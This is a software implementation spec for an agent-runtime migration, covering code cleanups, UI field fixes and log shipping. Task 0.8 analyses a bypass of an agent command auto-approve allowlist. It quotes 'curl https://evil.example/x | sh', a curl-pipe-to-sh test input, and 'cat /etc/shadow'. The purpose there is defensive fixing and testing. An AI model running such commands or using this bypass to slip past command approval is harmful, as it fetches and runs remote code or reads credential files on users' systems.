| `RESULT_SCHEMA_PLAN` / `RESULT_SCHEMA_QA` | the two `resultSchema` literals, imported from `PLAN_PAYLOAD_CONTRACT.schema` / `QA_PAYLOAD_CONTRACT.schema` — **never hand-written**, per §A.8a |
| `ENVELOPE_UNKNOWN_STAGE` | `correlation.stage: 'deploy-fix'` — accepted by the runtime, rejected by the consumer (§A.2.1's courier rule) |
| `ENVELOPE_UNKNOWN_V` | `v: 2` |
| `ENVELOPE_EMPTY_EVENTS` | `events: []` |
| `ENVELOPE_NO_DEDUP_ID` | `dedupId` absent |
| `SESSION_COMPLETED` / `SESSION_NO_COMMIT` | `AgentSession` records for `buildCompletionEffect` |

**Freeze each fixture with `Object.freeze` at export.** The suites run in one jest process and share these objects; a test that mutates one corrupts another, and the symptom is an order-dependent failure that is miserable to diagnose.

**The plan and review payload fixtures must be built from `PLAN_PAYLOAD_CONTRACT` / `QA_PAYLOAD_CONTRACT`** (§A.8a), never hand-written. A hand-written fixture can pass a validator it no longer matches, and the suite becomes decorative.

**One test binds all three consumers of each contract**, and it is the most valuable test in §A.9:

| Test name (sentence) | Assertion |
|---|---|
| `it('states in the prompt exactly what the validator requires')` | every key in `PLAN_PAYLOAD_CONTRACT.requiredKeys` appears in the text `buildInstructions` produces for the `plan` role, and vice versa. Same for QA. **This is the test the runtime does not have, and its absence is why `saveLearnedPattern` has been broken in production** (§A.5.0a) |
| `it('ships the same schema to the runtime that the consumer validates against')` | the object `createSession` puts in `resultSchema` is reference-identical (or deep-equal) to the one `validateCompletionPayload` uses. Two copies is the drift this design exists to prevent |

---

## Phase 0 — free cleanups

**Dependencies: none.** Every task here is independently correct today, independent of every other phase, and independently shippable. Ship it now. Do not wait for Phase 1.

**Parallelism:** all nine tasks are independent of each other and touch disjoint files, with one exception — tasks 0.2, 0.3 and 0.4 all touch `runtimeDispatch.js` and its test, so they are one commit (task 0.2) rather than three.

**Why Phase 0 matters more than "cleanup" suggests:** task 0.5 is the mitigation for architecture doc **R0 — the highest-probability silent failure in the whole migration.** `applyRuntimeEffect` writes `progressLog`; the UI reads `activities`. Moving execution to the runtime would, with no other change, replace a working live activity feed with an empty one — the most visible part of the cycle UI, silently gone, at exactly the moment operators most need to see what the new execution path is doing.

**Read Task 0.5 in full before starting it.** The one-line version of that fix is wrong: `cycle?.progressLog || cycle?.activities` never reaches the fallback, because the cycle record initialises `progressLog: []` and `[]` is truthy — so it blanks the **legacy** feed instead, on every un-migrated application, for the whole migration. There are three writers, not two, and the correct fix is a shared pure selector that merges and sorts. It is the only task in Phase 0 that is more than an afternoon.

### Task 0.1 — delete `backend/common/codingAgentAdapter.js`

**Files:** `backend/common/codingAgentAdapter.js` (DELETE, 279 lines).

**Verification that it is dead, done — do not repeat it, but do re-run the grep before deleting in case something landed since:**

```
grep -rn "codingAgentAdapter" . | grep -v "/node_modules/" | grep -v "/.git/" | grep -v "/.claude/worktrees/" | grep -v package-lock.json
```

As of `938be378` this returns only `context/plans/`, `context/specs/` and `docs/agent-architecture-plan.md` — documentation, no code. **Note the `.claude/worktrees/` exclusion: that directory holds full stale copies of the tree and will produce phantom hits in both this repo and `nevado-sherpa-tui`.**

**Do NOT delete `backend/lambda_handlers/agentDrivenOrchestrator/agentInterface.js`.** It is live: `backend/lambda_handlers/cursorAgent/devHandler.js:8` requires `DevAgent` and `qaHandler.js:8` requires `QAAgent`, both handlers extend them, and the cursor-agent Lambda is deployed (`infrastructure/lambdas.tf:1474-1501`, ARNs wired into the orchestrator's env at `:1541-1542`, both pointing at the same function). Deleting it breaks a shipped integration. The two files are not the same case and conflating them is how a dead-code sweep takes out a live dependency.

**Tests first:** none. There is nothing to test about an absence, and a test asserting the file does not exist is the kind of filler this spec forbids. **Not TDD — verified by** the grep above plus the existing suite staying green (the file is in the shared Lambda Layer, so a stray require would fail at Lambda cold start, not in jest; the grep is the real check).

**Acceptance:**
- `grep -rn "codingAgentAdapter" backend/ frontend/ infrastructure/ scripts/` returns nothing.
- `npm run test:backend` passes (31 suites).

**Commit:** `chore: delete unused codingAgentAdapter`

### Task 0.2 — fix the three live bugs in `runtimeDispatch.js`

These are shipped bugs, not future work. All three would fire on the first real session create.

**Files:**
- `backend/lambda_handlers/agentDrivenOrchestrator/runtimeDispatch.js` (MOD)
- `backend/__tests__/runtimeDispatch.test.js` (MOD)

**The three bugs, verified:**

| # | Line | Bug | Effect |
|---|---|---|---|
| B1 | `:45` | `mode: 'agent'` | `'agent'` is not a member of `SessionCommand`, which is `'do' \| 'plan'` (`sherpa-sdk/packages/protocol/src/session.ts:2`). Confirmed no `'agent'` member exists. The runtime would reject or mis-handle every create. |
| B2 | `:42-44` | `prompt: typeof expandedRequirements === 'string' ? expandedRequirements : (task \|\| '')` | `expandedRequirements` is **always an object** — `index.js:1300-1301` says so in a comment written after someone got this exact thing wrong. So the ternary always takes the else branch and **the approved plan is silently dropped**; the agent receives only the raw one-line task. |
| B3 | `:48` | `name: task.slice(0, 80)` | `SESSION_NAME_MAX_LENGTH = 50` (`session.ts:165`). An 80-char name is a 400 on the first real create. |

**Tests first.** `backend/__tests__/runtimeDispatch.test.js` already exists (132 lines) and its assertions currently **pin the bugs** — `:33` asserts `mode: 'agent'`, `:51` asserts the plan is dropped, `:63` asserts `req.name.length` is 80. Rewrite those three assertions before touching the source, watch them fail, then fix.

| Test name (sentence) | Input | Assertion |
|---|---|---|
| `it('builds mode "do" — "agent" is not a member of SessionCommand')` | `{task:'t', expandedRequirements:{summary:'s'}, repoUrl:'r'}` | `req.mode === 'do'` and, explicitly, `expect(['do','plan']).toContain(req.mode)` so a future typo is caught by the union rather than by an equality |
| `it('sends the plan as the prompt when expandedRequirements is an object — the shape it is always in')` | `{task:'one-liner', expandedRequirements:{summary:'S', approach:'A', requirements:[{id:'REQ-001',title:'T'}]}, repoUrl:'r'}` | `req.prompt` contains `'S'` **and** `'REQ-001'`; `req.prompt !== 'one-liner'` |
| `it('falls back to the task only when there is no plan at all')` | `{task:'just the task', expandedRequirements: null, repoUrl:'r'}` | `req.prompt === 'just the task'` |
| `it('caps the session name at SESSION_NAME_MAX_LENGTH (50), not 80')` | `{task:'x'.repeat(200), ...}` | `req.name.length === 50` |
| `it('omits branch and name when absent rather than sending empty strings')` | existing test at `:54-58` | unchanged; keep it |
| `it('requires a repoUrl — a runtime session has nothing to work on without one')` | existing test at `:66-69` | unchanged; keep it |

Also **update the `describe('createRuntimeSession (stub)')` block at `:82-89`**, which asserts `mode: 'agent'` on the built request. Same change.

**Implementation:**

- B1: `mode: 'agent'` → `mode: 'do'`. This module is only reached from the engineering dispatch branch (`index.js:1628`), so `'do'` is right; the `'plan'` caller arrives in Part 2 Phase 5 and will pass `mode` in.
- B2: the prompt is the plan, serialised. **Do not `JSON.stringify` the object into the prompt.** Phase 2 Task 2.7 builds real message composition; until then the minimum correct behaviour is a readable rendering of the plan that includes `summary`, `approach` and the requirement titles, falling back to `task` only when `expandedRequirements` is null/undefined. Keep it to a small local `renderPlanAsPrompt(plan)` in this module so Task 2.7 has one place to replace.
- B3: `task.slice(0, 80)` → `task.slice(0, 50)`. **Define the 50 as a named constant with a drift-guard comment**, because the backend cannot import `SESSION_NAME_MAX_LENGTH` (it is an ESM export from a frontend-only dependency — §0.0):

  ```js
  /**
   * Mirrors SESSION_NAME_MAX_LENGTH from @nevadoai/sherpa-protocol
   * (packages/protocol/src/session.ts:165). Ported, not imported: the protocol package
   * is an ESM frontend dependency and backend/common ships in a shared Lambda Layer —
   * see backend/common/sherpaSessions.js:21-27 for the full reasoning.
   * Pinned by backend/__tests__/sherpaSdkDriftGuard.test.js.
   */
  const SESSION_NAME_MAX_LENGTH = 50;
  ```

**Also delete the stale module docblock claims** while you are in the file. `runtimeDispatch.js:10-18` says *"`enable_sherpa_runtime` is `false` so no runtime is even deployed"* and *"When the runtime is deployed and a service-to-service auth path exists"*. Both are now false: the runtime **is** deployed in testing (`enable_sherpa_runtime` defaults to `false` in `sherpa-ec2.tf:58` but `deploy-testing.yml:99` passes `true`), and the auth path is Phase 1. Leaving a docblock that says the opposite of reality is how the next reader loses an hour.

**Acceptance:**
- `cd backend && npx jest __tests__/runtimeDispatch.test.js` passes.
- `grep -n "'agent'" backend/lambda_handlers/agentDrivenOrchestrator/runtimeDispatch.js` returns nothing.
- `grep -n "slice(0, 80)" backend/lambda_handlers/agentDrivenOrchestrator/runtimeDispatch.js` returns nothing.

**Commit:** `fix: correct session mode, prompt and name length in runtime dispatch`

### Task 0.3 — (folded into 0.2)

See Task 0.2. Kept as a numbered placeholder so task numbers match the architecture doc's Phase 0 bullet list.

### Task 0.4 — (folded into 0.2)

See Task 0.2.

### Task 0.5 — fix the activity-feed selector and `CycleProgress.jsx`'s field-name mismatches

**This is R0's mitigation, and the first version of it was wrong in a way that re-created the failure it exists to prevent.** Read the whole task before writing code.

**Files:**
- `backend/common/cycleActivities.js` (NEW)
- `backend/__tests__/cycleActivities.test.js` (NEW)
- `frontend/vite.config.js` (MOD — one alias line)
- `frontend/src/components/CycleProgress.jsx` (MOD)
- `backend/lambda_handlers/agentDrivenOrchestrator/progressTracker.js` (MOD)
- `backend/__tests__/cycleProgressContract.test.js` (NEW)

#### The bug in the obvious fix

The obvious fix, and what an earlier draft of this spec prescribed, is:

```js
const activities = cycle?.progressLog || cycle?.activities || [];   // WRONG
```

**The `activities` fallback is dead code.** The cycle record initialises `progressLog: []` at `index.js:1096`, and **`[]` is truthy in JavaScript**. So that expression returns `[]` for every cycle that has not yet written a progress line, and never consults `activities` at all.

The consequence is R0 inverted, and it is worse than R0 because it ships in Phase 0 and bites immediately. **There are three progress writers, not two:**

| Writer | Field | Entry shape |
|---|---|---|
| `backend/common/progressLogger.js:43` | `progressLog` | `{timestamp, stage, message, detail?}` (`:30-35`) |
| `backend/lambda_handlers/engineeringAgent/orchestratorHandler.js:102` | `activities` | `{timestamp, phase: 'dev', stage, message, detail?}` (`:93`) |
| `backend/lambda_handlers/agentDrivenOrchestrator/progressTracker.js:55` | `activities` | `list_append` onto `activities` |

A legacy SSM cycle writes only `activities`. Under the broken fix its feed renders `[]`. **So the commit that exists to stop the runtime path's feed going blank would make the legacy path's feed go blank instead, on every un-migrated application, for the entire duration of the migration** — Phases 4 through 6, which is exactly when both writers are live and when operators most need to see both.

**And there is a second instance of the same bug, in the backend, which the review did not find.** `progressTracker.js:190` is:

```js
activities: cycle.activities || cycle.progressLog || [],   // same defect, opposite direction
```

`activities` is *not* initialised on the cycle record, so this one works for a fresh cycle — but the moment the legacy engineering agent appends a single `activities` entry, it stops consulting `progressLog` and drops every orchestrator-written progress line from whatever consumes `progressTracker`'s output. Same fix, and unlike the JSX this one is directly unit-testable.

#### The fix: one shared pure selector

Both arrays can be non-empty simultaneously, and their entries need to interleave by time, so a fallback chain is the wrong shape entirely. **Merge and sort.**

Create `backend/common/cycleActivities.js`:

```js
/**
 * The cycle activity feed, merged from every writer.
 *
 * Three writers append progress to two different fields — progressLog (progressLogger.js:43)
 * and activities (engineeringAgent/orchestratorHandler.js:102, progressTracker.js:55) — and
 * during the runtime migration both are live on different cycles. A fallback chain cannot
 * express that: `cycle.progressLog || cycle.activities` never reaches the fallback, because
 * the cycle record initialises `progressLog: []` (index.js:1096) and [] is truthy. That bug
 * blanked the legacy feed; see sdlc-runtime-impl-spec-part1-foundation.md Task 0.5.
 *
 * Lives in backend/common/ rather than in the component so backend jest can test it and the
 * frontend can import it through the existing vite alias — the same arrangement
 * backend/common/cycleStatuses.js already uses (frontend/vite.config.js:19).
 */
function selectActivities(cycle) { /* … */ }
module.exports = { selectActivities };
```

Required behaviour, and each clause is a test below:

| Rule | Why |
|---|---|
| Concatenate `progressLog` and `activities`, treating a missing or non-array field as `[]` | three writers, two fields, both live during the migration |
| Sort **ascending** by `timestamp` | the renderer does `activities.slice(-10).reverse()` (`CycleProgress.jsx:76`), so ascending-then-slice-last-10 is what yields the ten newest, newest-first |
| Read the timestamp as `entry.timestamp ?? entry.Timestamp` | the renderer already tolerates both capitalisations (`:177`), so the selector must sort on the same value it will render |
| An entry with a missing or unparseable timestamp **sorts last and does not throw** | a malformed entry must degrade, not blank the feed — that is the whole lesson of this task |
| **No de-duplication** | the two fields are written by disjoint code paths, so a genuine duplicate is not expected; and per §A.4.5 a duplicated activity line is explicitly the cosmetic place for the at-least-once trade to land. Do not add dedup logic that could drop a real entry |
| Return a new array; never mutate `cycle` | it is called from a React render path |

Then:

- **`frontend/vite.config.js`** — add one alias beside the existing one at `:19`:
  ```js
  'common/cycleActivities': path.resolve(__dirname, '../backend/common/cycleActivities.js'),
  ```
  `build.commonjsOptions.include` already covers `/backend\/common/` (`:26-27`), so no other build change is needed. **This is an established pattern, not a new one** — `CycleProgress.jsx:3` already does `import cycleStatuses from 'common/cycleStatuses'`.
- **`CycleProgress.jsx:75`** → `const activities = selectActivities(cycle);`
- **`progressTracker.js:190`** → `activities: selectActivities(cycle),`

#### The three field-name mismatches, unchanged from the earlier draft

| # | Line | Frontend reads | Backend writes | Symptom today |
|---|---|---|---|---|
| M1 | `:75` | `cycle?.activityLog \|\| cycle?.activities \|\| []` | `progressLog` and `activities` | **`activityLog` does not exist anywhere in the backend.** Fixed by `selectActivities` above, which also drops `activityLog` — a name nothing writes, whose presence in the chain tells the next reader that something does |
| M2 | `:69-71` | `cycle.createdAt` | `startedAt` (`index.js:1091`) | the elapsed-time display is **always empty** |
| M3 | `:149-158` | `cycle.iteration` | `currentIteration` (`index.js:1093`) | the iteration bar **never renders** |

- M2 → `cycle?.startedAt` in both the guard (`:69`) and the `new Date(...)` (`:70`). Leave `cycle.completedAt` at `:71`; verify separately whether anything writes it, and if not the `Date.now()` fallback is already correct for a running cycle.
- M3 → `cycle?.currentIteration` at `:149`, `:151` and `:155`. `maxIterations` at `:155`/`:158` is already correct (`index.js:1094`).

**Also note, and do not fix here:** `PIPELINE_STAGES` index 3 (`draft_pr`, `:21`) is **unreachable** — no status in `mapStatusToStageIndex` (`:32-56`) maps to 3; `building` and `pr_checks_pending` both jump to 4. Fixing it means deciding *which* status means "draft PR exists", which is a product question. **Raise it as a separate issue; do not silently renumber the array**, because renumbering shifts every index below it.

#### Tests first — behavioural, not source regexes

**The earlier draft's tests were all source-text regexes over field names and would not have caught the truthiness bug.** That is the single clearest instance in this spec of "TDD claimed, but the test as written cannot fail on the bug it is aimed at." The selector is now a pure function in `backend/common/`, so it is testable properly. **Write these first and watch the merge-and-sort tests fail against a fallback-chain implementation.**

`backend/__tests__/cycleActivities.test.js`. Fixtures as named constants at the top of the file, one per scenario, so each test reads as a sentence about a situation.

| Test name (sentence) | Fixture | Assertion |
|---|---|---|
| `it('returns the legacy activities when progressLog is the empty array the cycle record initialises')` | `{progressLog: [], activities: [{timestamp: T1, message: 'legacy'}]}` | one entry, `message: 'legacy'`. **This is the regression test for the bug. It fails on `progressLog \|\| activities`, which is the point** |
| `it('returns the runtime progressLog when there are no legacy activities')` | `{progressLog: [{timestamp: T1, message: 'runtime'}]}` (no `activities` key) | one entry, `message: 'runtime'` |
| `it('interleaves both feeds in timestamp order when both are populated')` | `activities` at T1 and T3, `progressLog` at T2 and T4 | four entries, messages in the order T1, T2, T3, T4. **Ascending**, because the renderer slices the tail |
| `it('returns an empty array when both feeds are empty')` | `{progressLog: [], activities: []}` | `[]` |
| `it('returns an empty array for a cycle with neither field')` | `{}` | `[]` |
| `it('tolerates a null or undefined cycle')` | `null`, `undefined` | `[]` for both, no throw. It is called from a render path |
| `it('sorts an entry with an unparseable timestamp last rather than throwing')` | one entry with `timestamp: 'not-a-date'`, one with T1 | two entries, T1 first, no throw |
| `it('sorts on the capitalised Timestamp variant the renderer also accepts')` | one `{Timestamp: T1, Message: 'x'}`, one `{timestamp: T2}` | ordered T1 then T2 |
| `it('ignores a non-array field rather than throwing')` | `{progressLog: 'oops', activities: [{timestamp: T1}]}` | one entry, no throw |
| `it('does not mutate the cycle')` | both feeds populated | `cycle.progressLog` and `cycle.activities` are unchanged in length and identity after the call |
| `it('preserves both entry shapes, since the renderer reads timestamp and message from either')` | a `progressLog` entry and an `activities` entry carrying `phase: 'dev'` | every returned entry has a `timestamp`-or-`Timestamp` and a `message`-or-`Message`; the `activities` entry still carries `phase` |

Then `backend/__tests__/cycleProgressContract.test.js` — the source-parsing guard, which is still worth having for the *wiring*, just not as the only test. Model it on `cycleActionWiring.test.js` and keep its anti-vacuity guard first.

| Test name (sentence) | Assertion |
|---|---|
| `it('finds cycle field reads in CycleProgress.jsx')` | extract every `cycle?.<field>` / `cycle.<field>`; the set has at least 6 members. **Must come first** — without it, a refactor renaming `cycle` makes the whole suite vacuously pass |
| `it('routes the activity feed through the shared selector rather than a local fallback chain')` | the JSX contains `selectActivities(` and does **not** contain `progressLog ||` or `activities ||`. This is the assertion that stops the truthiness bug being reintroduced by someone "simplifying" the import away |
| `it('routes progressTracker through the same selector')` | `progressTracker.js` contains `selectActivities(` and not `cycle.activities ||` |
| `it('does not read activityLog, which nothing in the backend writes')` | a repo-wide grep under `backend/` for `activityLog` returns zero **and** the JSX read set does not contain it. Two assertions, because either alone is satisfiable by the wrong fix |
| `it('reads startedAt, not createdAt — createdAt is never written to a cycle')` | read set contains `startedAt`, not `createdAt` |
| `it('reads currentIteration, not iteration')` | read set contains `currentIteration`, not `iteration` |
| `it('reads no cycle field the orchestrator never writes')` | `readSet - writeSet - KNOWN_UI_ONLY` is empty, where the write set is extracted from the cycle-record literal in `index.js` and `KNOWN_UI_ONLY` is an explicit allowlist (`completedAt`, `pullRequest`, `task`, …) each with a one-line reason. Model the allowlist and the "no stale entries" test on `frontendContractGuard.test.js:55-76` and `:160-168`. **This is the test that catches the *next* M1** |

**Acceptance:**
- `cd backend && npx jest __tests__/cycleActivities.test.js __tests__/cycleProgressContract.test.js` passes.
- **`npm run lint:frontend` produces no new findings** versus the `develop` baseline — it **fails outright on clean `develop`** (§0.2), so "passes" is unsatisfiable. And `npm run build:frontend` **succeeds** — build it, because a broken import fails at build time rather than at lint time.
- Manual, once: load a cycle in the UI and confirm the activity feed, the elapsed time and (on an iterating cycle) the iteration bar all render. **This is the screenshot the architecture doc's Phase 0 asks for.** Not automatable today, and a Playwright test needing a live iterating cycle would be worse than the manual check.

**Commit:** `fix: merge both progress feeds into one activity selector`

### Task 0.6 — fix `technicalApproach` → `approach`, and pin the wiring that makes the dialog reachable

**Files:**
- `frontend/src/pages/ApplicationDetail.jsx` (MOD — two property names)
- `backend/__tests__/cycleProgressContract.test.js` (MOD — add the reachability guard)

#### Read this first: an earlier revision of this task said "delete the dialog." That was wrong.

Revision 3 of this spec concluded the plan-review dialog in `ApplicationDetail.jsx` was unreachable dead code and prescribed deleting it. **The conclusion was wrong and the method that produced it was flawed in a way worth recording**, because it is a trap anyone auditing React code will fall into.

The evidence offered was: *"all four `setPlanningReviewData(` call sites pass `null`."* That grep pattern — `setPlanningReviewData(`, **with an opening paren** — finds invocations. It cannot find **a setter handed to a child as a prop**, because a bare reference has no paren. There are five sites, not four:

```
frontend/src/pages/ApplicationDetail.jsx
:75    const [planningReviewData, setPlanningReviewData] = useState(null);
:618   onReviewPlan={setPlanningReviewData}          <- the fifth site. No paren. Invisible to the grep.
:1678  onClick={() => setPlanningReviewData(null)}
:1683  onClick={() => setPlanningReviewData(null)}
:1783  onClick={() => { handleRejectPlan(planningReviewData); setPlanningReviewData(null); }}
:1789  onClick={() => { handleApprovePlan(planningReviewData); setPlanningReviewData(null); }}
```

**The dialog is reachable, and the full chain is live in the working tree** — verified end to end:

```
cycleStatusConfig.js:38     PLANNING_REVIEW → primaryAction: 'review-plan'
        ↓
AttentionCard.jsx:20        action.replace(/-/g, '_')        → 'review_plan'
AttentionCard.jsx:25-26     case 'approve_plan': onReviewPlan?.(cycle)
                            case 'review_plan':  onReviewPlan?.(cycle)     ← a NON-NULL cycle
        ↓
ApplicationDetail.jsx:618   onReviewPlan={setPlanningReviewData}
        ↓
ApplicationDetail.jsx:1676  {planningReviewData && ( … )}    ← the guard opens
ApplicationDetail.jsx:1750  …expandedRequirements.technicalApproach   ← renders blank
```

**So there are two live plan-review surfaces, not one:** `PlanReview.jsx` via `ActiveCycleHero.jsx:51-59`, and this dialog via the attention card's primary action. Both are reached on `PLANNING_REVIEW`.

**⚠ And the wiring is uncommitted.** `grep -c onReviewPlan` against committed `HEAD` returns **0** for both `ApplicationDetail.jsx` and `AttentionCard.jsx`. The chain exists only in the working tree, alongside `cycleStatusConfig.js`'s `primaryAction: 'review-plan'` — all three files are in the uncommitted frontend diff. **That is exactly why a delete would have been damaging:** it would have removed a surface that in-flight work is actively wiring up, and **Part 2's Task 5.3 and Task 4b.4 both depend on that same diff.**

#### The fix — the original field-name correction, restored

Both occurrences of `technicalApproach` → `approach`:

```
ApplicationDetail.jsx:1750   {planningReviewData.expandedRequirements.technicalApproach && (
ApplicationDetail.jsx:1753     …{planningReviewData.expandedRequirements.technicalApproach}
```

**`technicalApproach` is written by nothing in the repo** — a repo-wide grep returns only these two lines. The planner emits **`approach`** (`engineeringAgent/orchestratorHandler.js:305`, inside `generatePlan`'s JSON-schema prompt block). So the panel renders blank today, and with the wiring above now live it renders blank *to a user at an approval gate*. One word each.

The surrounding label text is human-facing and should stay whatever reads best; only the property name changes.

**⚠ Find them by content, not by line number.** `ApplicationDetail.jsx` has uncommitted changes (+77/−24 vs `HEAD`); at `HEAD` these lines are `:1707`/`:1710`. Use `grep -n "technicalApproach" frontend/src/pages/ApplicationDetail.jsx`.

#### If the uncommitted frontend work is abandoned, the delete becomes correct

State this in the commit body, because it is the one thing a future reader needs: **this task's correctness is contingent on `onReviewPlan={setPlanningReviewData}` surviving.** If that diff is dropped — rebased away, or the attention-card approach abandoned — then the dialog really is unreachable and deleting it becomes the right call after all.

That contingency is confined to **one line**, and the guard test below is what surfaces it. **Part 2 has written its side (Tasks 5.3, 4b.4) to reverse the same way**, so a decision to abandon the attention-card route is a coordinated reversal in both documents rather than a hunt.

#### Tests first

The reachability guard is the important half. Without it, a rebase that drops the uncommitted work leaves a panel that renders nothing, with no failing test — the exact silent-death mode this spec's §0.2 source-guard convention exists to catch. Model it on `cycleActionWiring.test.js`, which was written for the sibling failure (`merge-pr` vs `merge_pr`, #708).

Add to `backend/__tests__/cycleProgressContract.test.js`:

| Test name (sentence) | Input | Assertion |
|---|---|---|
| `it('keeps the plan dialog reachable from the attention card')` | read `ApplicationDetail.jsx` and `AttentionCard.jsx` as text | `ApplicationDetail.jsx` contains `onReviewPlan={setPlanningReviewData}` **and** `AttentionCard.jsx` dispatches `review_plan` to `onReviewPlan`. **This is the pin.** If a rebase drops either, this fails loudly instead of the panel dying silently |
| `it('routes the PLANNING_REVIEW primary action to a handler that opens the dialog')` | read `cycleStatusConfig.js` | `PLANNING_REVIEW`'s `primaryAction` normalises (hyphens→underscores) to a `case` label present in `AttentionCard.jsx`. Closes the loop `cycleActionWiring.test.js` opened, for this specific action |
| `it('reads the plan field the planner emits, not an invented one')` | extract `expandedRequirements.<field>` reads from `ApplicationDetail.jsx`; extract the planner's JSON-schema keys from `generatePlan`'s prompt block (`orchestratorHandler.js:301-321`) | every field the dialog reads is a key the planner emits. **Anti-vacuity guard first:** the planner key set has ≥ 8 members and the dialog read set has ≥ 3 |
| `it('does not read technicalApproach, which nothing writes')` | repo-wide grep under `backend/` and `frontend/` | zero hits **and** the dialog's read set does not contain it. Two assertions, because either alone is satisfiable by the wrong fix |
| `it('accounts for both live plan-review surfaces')` | grep `frontend/src` for components rendered on `PLANNING_REVIEW` | finds **both** `PlanReview.jsx` (via `ActiveCycleHero.jsx`) and the `ApplicationDetail.jsx` dialog. **Two surfaces reading the same `expandedRequirements` is a real duplication** — not this task's to resolve, but it must not be discovered again by accident. §A.8a's required set is derived from both |

**Acceptance:**
- `cd backend && npx jest __tests__/cycleProgressContract.test.js` passes.
- `grep -rn "technicalApproach" backend/ frontend/` returns nothing.
- `grep -c "onReviewPlan={setPlanningReviewData}" frontend/src/pages/ApplicationDetail.jsx` returns `1`.
- `npm run lint:frontend` passes.
- Manual, and worth doing since this is a gate a human uses: open a cycle in `planning_review`, click the attention card's primary action, and confirm the approach panel now renders with content.

**Commit:** `fix: read expandedRequirements.approach in the plan review dialog`

### Task 0.7 — ship runtime logs to CloudWatch

**Files:** `infrastructure/sherpa-ec2-cloud-init.sh.tftpl` (MOD).

**Why:** the log group `/aws/ec2/${var.customer_id}-sherpa-runtime` is already provisioned with 30-day retention (`infrastructure/sherpa-ec2.tf:337-343`), and the comment above it (`:331-335`) says it is reserved *"once we ship CloudWatch shipping"*. **Nothing ships to it.** The CloudWatch agent config heredoc (`sherpa-ec2-cloud-init.sh.tftpl:91-104`, applied at `:106-108`) collects `mem_used_percent` and `disk_used_percent` and nothing else — **no `logs` section at all.** The systemd unit sends stdout and stderr to journald (`:164-165`), and journald is not persisted, so an instance replacement takes the evidence with it. Today the only way to read a runtime log is an SSM session onto the box this migration exists to stop using.

**This is a config block, not new infrastructure.** The log group, its retention and the instance role's `logs:*` grant already exist.

**The change:** add a `logs` section to the existing agent config collecting the `sherpa-runtime` unit's journal into the existing group. Set `log_stream_name` to the instance id so a replacement does not overwrite history.

**Also: put `sessionId` in the runtime's log lines** so a cycle traces to its logs. That is a change in `nevado-sherpa-tui/apps/runtime`, not in Terraform — raise it as a separate task there (see Phase 1 Task 1.6's note). Shipping the logs without the correlation id still beats journald-only; do not block one on the other.

**⚠ This will not take effect on the running instance without action.** `infrastructure/sherpa-ec2.tf:375` sets `user_data_replace_on_change = false`, and `:397-402` carries `lifecycle { ignore_changes = [ami] }`. **A cloud-init template change does not replace the instance and does not re-run on it.** So this task has two halves:

1. The Terraform change, so every future instance ships logs.
2. A **manual** application to `i-0d5271e1ce5ea4fb0` — either write the agent config and `amazon-cloudwatch-agent-ctl -a fetch-config` over SSM, or replace the instance deliberately. Replacing it kills every live session, so on a shared runtime this is an out-of-hours job. Coordinate it with whoever owns the runtime.

**Tests first:** none. **Not TDD — verified by:**

```
aws logs describe-log-streams --profile testing-tooling --region us-east-1 \
  --log-group-name /aws/ec2/testing-sherpa-runtime --order-by LastEventTime --descending --max-items 5
```

Expected before: an empty `logStreams` array (the group exists, nothing in it). Expected after step 2: at least one stream named for the instance id, with a recent `lastEventTimestamp`. Then:

```
aws logs tail /aws/ec2/testing-sherpa-runtime --profile testing-tooling --region us-east-1 --since 10m
```

Expected: runtime startup lines.

**Deploy targets:** none needed. `sherpa-ec2-cloud-init.sh.tftpl` is consumed by `templatefile()` in `local.sherpa_runtime_user_data` (`sherpa-ec2.tf:347-359`) and affects `aws_instance.sherpa_runtime`, which **is not in `deploy-dev.yml`'s target list at all** — the Sherpa EC2 runtime exists only in testing/customer accounts, deployed by the full untargeted apply in `deploy-customer-instance.yml`. Adding a target entry for it would be wrong. **If you add a new `Environment=` line to the systemd unit you must also add it to the `templatefile()` variable map at `sherpa-ec2.tf:347-359`** or `terraform plan` fails with an unset template variable — that bites in Phase 3 Task 3.7.

**Rollback:** revert the template; the running instance is unaffected by the revert for the same reason it is unaffected by the change. If step 2's manual config breaks the CloudWatch agent, `amazon-cloudwatch-agent-ctl -a stop` then re-fetch the previous config. No session is affected either way — the agent is a sidecar, not in the request path.

**Commit:** `feat: ship sherpa runtime journal to CloudWatch Logs`

### Task 0.8 — fix the `auto-approve.ts` splitter in `sherpa-sdk`

**Files:** `sherpa-sdk/packages/core/src/engine/auto-approve.ts` (MOD) + its test file.

**Different repo, different PR.** This affects **human sessions today** and is not gated on anything in this plan. Ship it independently.

**✅ Revision 6: this one landed upstream — `sherpa-sdk` #220, "fix(core): hold every command in a runCommand line to the auto-approve allowlist".** It is the only SDK change in this document that both shipped and was needed. **Two things follow, and the second is the one that matters:**

- **Nothing here consumes it.** The runtime's `pnpm-lock.yaml` pins `4.0.1`, which predates the fix, so **the deployed runtime still has the single-`|` bypass.** Do not read "fixed upstream" as "fixed in production" — that gap closes only on the 64-commit HEAD bump (BQ3(b)), on the runtime owner's schedule.
- **It changes nothing about §A.7.4's decision.** SDLC sessions ship `autoApproveAllCommands: true` regardless, so this fix is not a control the SDLC path relies on and must not be cited as one. Its value is entirely on the **human** surface, which is exactly why it was worth shipping independently.

Keep the analysis below: it is the record of what the bug was, and the acceptance criteria are what a re-verification against any future SDK version should assert.

**The bug** (`auto-approve.ts:38`):

```ts
const parts = command.split(/&&|\|\||;/);
return parts.every(part => allPatterns.some(p => matchesPattern(part.trim(), p)));
```

It splits on `&&`, `||` and `;` — **but not on a single `|`**. So `curl https://evil.example/x | sh` is one part, starts with `curl ` (a default-allowlist pattern, `:8-24`), and is auto-approved. Command substitution (`$(...)`, backticks) is not considered at all. `matchesPattern` (`:33`) is `cmd === p || cmd.startsWith(p)`, so `cat /etc/shadow` matches `cat `.

**The fix:**
1. Split on a single `|` as well as `||`. Order matters in the regex: `\|\|` must be tried before `\|`, so `/&&|\|\||\||;/` or equivalently `/&&|;|\|+/`.
2. Reject outright — never auto-approve — any command containing `$(`, a backtick, `<(` or `>(`. These are substitution and process-substitution forms that no prefix test can reason about.
3. Also consider `\n` and `&` as separators. A newline in a command string is a statement separator; a trailing single `&` backgrounds. Both are currently invisible to the splitter.

**Tests first.** Find the existing test file (`auto-approve.test.ts` or equivalent under `packages/core`) and add, before the fix:

| Test name (sentence) | Input | Assertion |
|---|---|---|
| `it('does not auto-approve a pipe into a shell')` | `'curl https://example.com/x \| sh'` | `false` |
| `it('does not auto-approve a pipe even when both sides are allowlisted')` | `'cat a.txt \| sed s/x/y/'` | `false` — conservative, and correct: the composition is not what was reviewed |
| `it('still auto-approves a plain allowlisted command')` | `'git status'` | `true` — the regression guard, and it must come with the others or the fix can pass by rejecting everything |
